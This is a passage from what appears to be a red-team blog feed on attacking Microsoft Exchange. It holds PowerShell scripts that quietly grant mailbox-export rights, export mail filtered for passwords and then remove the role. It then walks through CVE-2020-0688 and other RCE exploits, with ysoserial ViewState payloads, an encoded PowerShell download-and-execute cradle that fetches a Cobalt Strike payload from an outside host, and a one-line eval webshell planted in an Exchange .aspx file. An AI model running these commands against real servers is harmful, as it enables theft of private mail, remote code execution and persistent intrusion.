AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">follow <span class="token keyword">from</span> 3gstudent <span class="token keyword">function</span> UsePSSessionToExportMailfromExchange<span class="token punctuation">&#123;</span><span class="token comment">#Requires -Version 2.0</span><span class="token comment">&lt;#.SYNOPSISThis script will export the mail(.pst) from the Exchange server.First it will use PSSession to connect the Exchange server.Then it'll check the user's privilege.If the user is not in the "Mailbox Import Export",the script will add the user to it and reconnect the Exchange server.Next it will export the mail and save it.At last it will remove the user from the group and remove the PSSession.Author: 3gstudent.PARAMETER UserThe user to use.In general, you can choose the account in the domain admins..PARAMETER PasswordThe password of the user..PARAMETER MailBoxThe mail you want to export..PARAMETER ExportPathThe export path of the mail..PARAMETER ConnectionUriThe uri of the Exchange server.Eg.    http://Exchange01.test.com/PowerShell/    .PARAMETER $FilterThe search filter of the mail..EXAMPLEPS C:\> UsePSSessionToExportMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ExportPath "\\Exchange01.test.com\c$\test\" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;"#></span> <span class="token keyword">param</span> <span class="token punctuation">(</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$User</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$Password</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$ConnectionUri</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$Filter</span><span class="token punctuation">)</span>    <span class="token variable">$Flag</span> = 0    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Import-PSSession"</span>     <span class="token comment">#Import-PSSession</span>    <span class="token variable">$Pass</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token operator">-</span>AsPlainText <span class="token variable">$Password</span> <span class="token operator">-</span>Force    <span class="token variable">$Credential</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token operator">-</span>ArgumentList <span class="token variable">$User</span><span class="token punctuation">,</span><span class="token variable">$Pass</span>    <span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>    <span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to check user"</span>    <span class="token comment">#check user</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token operator">-</span>ErrorAction SilentlyContinue<span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>    <span class="token function">Write-Host</span> <span class="token string">"[!] The specified user already exists.No need to add it to the group"</span><span class="token variable">$Flag</span> = 1    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to add user"</span>     <span class="token comment">#Add user</span>    <span class="token function">New-ManagementRoleAssignment</span> –Role <span class="token string">"Mailbox Import Export"</span> –User <span class="token variable">$User</span><span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to reconnect"</span>    <span class="token comment">#Reconnect</span>    <span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>    <span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>    <span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token punctuation">&#125;</span>    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span>     <span class="token comment">#Export mail and do not save the export request</span>    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token variable">$Filter</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Flag</span> = 0<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to remove user"</span>    <span class="token comment">#Remove user</span>    <span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token punctuation">|</span><span class="token function">Remove-ManagementRoleAssignment</span> <span class="token operator">-</span>Confirm:<span class="token boolean">$false</span>    <span class="token punctuation">&#125;</span>        <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Remove-PSSession"</span>    <span class="token comment">#Remove PSSession</span>    <span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Use-exchange-1"><a href="#Use-exchange-1" class="headerlink" title="Use exchange"></a>Use exchange</h3><h4 id="Export-special-user-1"><a href="#Export-special-user-1" class="headerlink" title="Export special user"></a>Export special user</h4><pre class="line-numbers language-none"><code class="language-none">Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;$User &#x3D; &quot;yangsir&quot;New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.18.png"></p><h4 id="PS-AUTO-1"><a href="#PS-AUTO-1" class="headerlink" title="PS AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">same way <span class="token keyword">from</span> the 3gstudent<span class="token keyword">function</span> DirectExportMailfromExchange<span class="token punctuation">&#123;</span><span class="token comment">#Requires -Version 2.0</span><span class="token comment">&lt;#.SYNOPSISThis script will export the mail(.pst) from the Exchange server.The script needs to be executed on the Exchange server.Author: 3gstudent.PARAMETER MailBoxThe mail you want to export..PARAMETER ExportPathThe export path of the mail. .PARAMETER $FilterThe search filter of the mail..PARAMETER $VersionThe version of the Exhange.It can be 2007,2010,2013 and 2016..EXAMPLEPS C:\> DirectExportMailfromExchange -MailBox "test1" -ExportPath "\\localhost\c$\test\" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;" -Version 2013#></span> <span class="token keyword">param</span> <span class="token punctuation">(</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$Filter</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$Version</span><span class="token punctuation">)</span>    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to add PSSnapin"</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2007<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>Admin<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2010<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>E2010<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>                <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>SnapIn<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span>     <span class="token comment">#Export mail and do not save the export request</span>    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token punctuation">&#123;</span><span class="token punctuation">(</span>body <span class="token operator">-like</span> <span class="token string">"*pass*"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><h3 id="PSSession-2"><a href="#PSSession-2" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">the same way to export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.22.png"></p><h3 id="Use-exchange-2"><a href="#Use-exchange-2" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">all tar to find the keyGet-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -EstimateResultOnlyall tar to find the key to export tar user dirGet-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppresstar user to find the key to export tar user dirSearch-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ECP"><a href="#ECP" class="headerlink" title="ECP"></a>ECP</h3><pre class="line-numbers language-none"><code class="language-none">let tar user into the Discovery Management group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.35.png"></p><pre class="line-numbers language-none"><code class="language-none">then go to this module<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.39.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Exchange </tag>
            
            <tag> Information collection </tag>
            
            <tag> Export Email </tag>
            
            <tag> Search Email </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exchange RCE methods</title>
      <link href="2021/07/29/exchange-rce-methods/"/>
      <url>2021/07/29/exchange-rce-methods/</url>
      
        <content type="html"><![CDATA[<h2 id="Get-exchange-version"><a href="#Get-exchange-version" class="headerlink" title="Get exchange version"></a>Get exchange version</h2><pre class="line-numbers language-none"><code class="language-none">You can get some thing about versionhttps:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;exchange&#x2F;new-features&#x2F;build-numbers-and-release-dates?view&#x3D;exchserver-2016<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.30.59.png"></p><pre class="line-numbers language-none"><code class="language-none">Check the source code below, and compare the official website to confirm the relevant version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.31.04.png"></p><h2 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">Principle：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;nVtE-OFoO076x6T0147AMw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Impact-amp-Fix"><a href="#Impact-amp-Fix" class="headerlink" title="Impact&amp;Fix"></a>Impact&amp;Fix</h3><pre class="line-numbers language-none"><code class="language-none">Impact:exchange2010Fix:https:&#x2F;&#x2F;msrc.microsoft.com&#x2F;update-guide&#x2F;vulnerability&#x2F;CVE-2020-17144<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">You can use these exphttps:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;CVE-2020-17144https:&#x2F;&#x2F;github.com&#x2F;Airboi&#x2F;CVE-2020-17144-EXP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.31.10.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.31.56.png"></p><pre class="line-numbers language-none"><code class="language-none">Another can write Memory shell：http:&#x2F;&#x2F;192.168.159.143&#x2F;ews&#x2F;soap&#x2F;?pass&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h2><h3 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">Principle：Incorrect validation of cmDlet parameters and a remote execution code vulnerability in the Microsoft Exchange server. An attacker who successfully exploits this vulnerability can run arbitrary code in the context of a system user. To exploit this vulnerability, you need to have the user rights to authenticate with an Exchange role. Since the Exchange service runs with the System rights, you can also obtain the highest System rights by triggering this vulnerabilityNote：The target user must have the data Loss Prevention permission. Usually, the user in the Exchange Security Groups has the data Loss Prevention permission.Members of exchange Security Groups are usually Exchange administratorsOther users in the organization can also use this interface to execute commands<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Impact-amp-Fix-1"><a href="#Impact-amp-Fix-1" class="headerlink" title="Impact&amp;Fix"></a>Impact&amp;Fix</h3><pre class="line-numbers language-none"><code class="language-none">Impact:exchange2016 cu16、cu17exchange2019 cu5、cu6Fix:https:&#x2F;&#x2F;msrc.microsoft.com&#x2F;update-guide&#x2F;vulnerability&#x2F;CVE-2020-16875<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">Interfaces involving commands&#x2F;ecp&#x2F;DLPpolicy&#x2F;ManagePolicyFromISV.aspx 0688 holes have a regular user of ecp access permissions to delete&#x2F;PowerShell  This interface is used by exchange administrators. This interface cannot be invoked by non-Exchange Seucity Groups members and can only be used for Kerberos authenticationmsf use：https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;pull&#x2F;14126You can use these exp：https:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.ps1.txthttps:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.py.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.32.03.png"></p><h2 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h2><h3 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">Principle：https:&#x2F;&#x2F;www.t00ls.net&#x2F;viewthread.php?tid&#x3D;55183The vulnerability was found in the Exchange Control Panel (ECP) component. Instead of generating random keys with each software installation, all Microsoft Exchange Servers have the same validationKey and decryptionKey in the web.config file after installation. These keys are used to secure ViewState. ViewState, on the other hand, is server-side data that an ASP.NET Web application stores on the client in a serialized format. The client returns this data to the server with the __VIEWSTATE request parameter.Thanks to the use of static keys, an authenticated attacker can trick the target server into deserializing maliciously created ViewState data. With the help of YSoSerial.net, an attacker can execute any.NET code on the Exchange Control Panel Web application. To exploit this vulnerability, we need to collect the ViewStateUserKey and VIEWSTATEGENERATOR values from the authenticated session. The ViewStateUserKey can be retrieved from the ASP.NET cookie, and the VIEWSTATEGENERATOR can be found in a hidden field. All of these can be easily found through tools in your browser.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Impact-amp-Fix-2"><a href="#Impact-amp-Fix-2" class="headerlink" title="Impact&amp;Fix"></a>Impact&amp;Fix</h3><pre class="line-numbers language-none"><code class="language-none">Impact:exchange2010 Service Pack 3exchange2013exchange2016exchange2019Fix:https:&#x2F;&#x2F;msrc.microsoft.com&#x2F;update-guide&#x2F;vulnerability&#x2F;CVE-2020-0688<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use-2"><a href="#Actual-use-2" class="headerlink" title="Actual use"></a>Actual use</h3><h4 id="Manual-use"><a href="#Manual-use" class="headerlink" title="Manual use"></a>Manual use</h4><pre class="line-numbers language-none"><code class="language-none">Several values are required here:CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF validationKey as defaultConfiguration file C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\web.config can be found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.32.10.png"></p><pre class="line-numbers language-none"><code class="language-none">Validationalg is the default SHA1__VIEWSTATEGENERATOR is B97B4E27 (available via &#x2F;ecp&#x2F;default.aspx return package, which may have the same value, or it may not be included in the package. Patch KB2919355 is updated with this field, but B97B4E27 is the default)ASP.NET_SessionId: 48fbc032-7ab9-405b-a6c2-c7d78b3ef318 (you can get it from cookie)Use the ysoserial construct statementysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;command&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator&#x3D;&quot;B97B4E27&quot; --viewstateuserkey&#x3D;&quot;48fbc032-7ab9-405b-a6c2-c7d78b3ef318&quot; --isdebug –islegacyyou will get these:&#x2F;wEy2gYAAQAAAP&#x2F;&#x2F;&#x2F;&#x2F;8BXXXXXXXXXXXXXXXXXXXXXXXXXXXXTz&#x2F;2z4qo6iw&#x3D;&#x3D;then use the url to encode payload add our url you can get these:https:&#x2F;&#x2F;192.168.3.144&#x2F;ecp&#x2F;default.aspx?__VIEWSTATEGENERATOR&#x3D;B97B4E27&amp;__VIEWSTATE&#x3D;%2FwEy2gYAAQAAAPXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXxTz%2F2z4qo6iw%3D%3Dgo to visit the dns log you will known success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.32.16.png"></p><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><pre class="line-numbers language-none"><code class="language-none">EXPhttps:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;cve-2020-0688python3 cve-2020-0688.py -s https:&#x2F;&#x2F;192.168.3.144&#x2F;owa -u micle -p Admin12345 -c &quot;ping t00ls.XXXXX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.32.41.png"></p><pre class="line-numbers language-none"><code class="language-none">use the ysoserialysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping t00ls.XXXXX&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator&#x3D;&quot;B97B4E27&quot; --viewstateuserkey&#x3D;&quot;ea98fbf7-951b-4885-8fb3-00f2cf3a2e73&quot; --isdebug –islegacy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.32.59.png"></p><pre class="line-numbers language-none"><code class="language-none">go to payload <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.33.19.png"></p><pre class="line-numbers language-none"><code class="language-none">your web code should become 500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.33.24.png"></p><pre class="line-numbers language-none"><code class="language-none">confirm the dns log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.33.29.png"></p><h4 id="CS-online"><a href="#CS-online" class="headerlink" title="CS online"></a>CS online</h4><pre class="line-numbers language-none"><code class="language-none">use powershellpowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.3.11:801&#x2F;aa&#39;))&quot;you must encode your powershell code，you can get like thispowershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAzAC4AMQAxADoAOAAwADEALwBhAGEAJwApACkAIgA&#x3D;the same way to use python3 cve-2020-0688.py -s https:&#x2F;&#x2F;192.168.3.144&#x2F;owa -u micle -p Admin12345 -c &quot;cmd  &#x2F;c powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAzAC4AMQAxADoAOAAwADEALwBhAGEAJwApACkAIgA&#x3D;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.33.39.png"></p><pre class="line-numbers language-none"><code class="language-none">confir success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.33.45.png"></p><pre class="line-numbers language-none"><code class="language-none">the same way to use the exe program<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.33.57.png"></p><h4 id="Interactive-shell"><a href="#Interactive-shell" class="headerlink" title="Interactive shell"></a>Interactive shell</h4><pre class="line-numbers language-none"><code class="language-none">EXPhttps:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;CVE-2020-0688&#x2F;This EXP need the .net environmentExchangeDetect.exe 192.168.3.144 micle Admin12345ExchangeCmd.exe 192.168.3.144 micle Admin12345success like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.42.07.png"></p><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><pre class="line-numbers language-none"><code class="language-none">If you can get an interactive shell then you can maybe to get a webshell First, you must find web dir exec cmd.exe &#x2F;c echo %ExchangeInstallPath%Then, you can write the webshell to aspxexec cmd.exe &#x2F;c echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;xx&quot;],&quot;unsafe&quot;);%^&gt;&gt;&quot;C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\LiveIdError.aspx&quot;success like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.42.16.png"></p><pre class="line-numbers language-none"><code class="language-none">confirm this is system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.42.23.png"></p><pre class="line-numbers language-none"><code class="language-none">Principle you must write the aspxshell into to the webconfig，but I find other file also to be success like this<span aria-hidden="true" 